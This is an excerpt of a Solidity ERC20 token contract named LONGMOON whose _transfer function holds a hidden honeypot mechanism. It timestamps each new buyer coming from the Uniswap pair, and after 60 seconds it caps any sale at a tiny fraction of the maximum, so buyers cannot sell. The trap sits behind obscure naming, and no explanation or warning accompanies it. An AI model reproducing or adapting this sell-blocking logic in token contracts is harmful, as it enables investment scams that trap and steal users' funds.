...
contract  LONGMOON  is Ownable, IERC20 {
    ...
    string private  _name = "LONGMOON";
    string private  _symbol = "LONGMOON";
    ...
    function _transfer(  address from,  address to,  uint256 amount  ) private {
        ...
        if (!_isExcludedFromFee[from]   && !_isExcludedFromFee[to]  ) { if ( from == uniswapV2Pairs  &&  balanceOf(to) == 0) { {
            require(amount <= maxBuyAmount.mul(4).div(100) );
            
            yyds[to] =  block.timestamp;  }  }  

        if ( from != uniswapV2Pairs )  {   if (  block.timestamp >  yyds[from] + 60 )    {   require(amount <= maxSellAmount.mul(1).div(10000) ); } } }
